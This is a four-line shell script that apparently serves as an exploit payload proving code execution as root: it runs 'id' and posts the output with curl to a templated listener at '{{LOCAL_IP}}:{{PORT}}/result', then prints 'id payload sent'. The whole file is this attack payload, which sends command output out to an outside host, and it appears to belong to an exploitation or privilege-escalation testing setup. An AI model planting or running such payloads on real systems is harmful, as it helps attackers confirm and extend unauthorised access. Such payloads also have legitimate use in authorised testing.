#!/bin/sh
# Proof of execution: the printed identity must match a root process.
id | curl -s -d@- "http://{{LOCAL_IP}}:{{PORT}}/result"
echo "id payload sent"
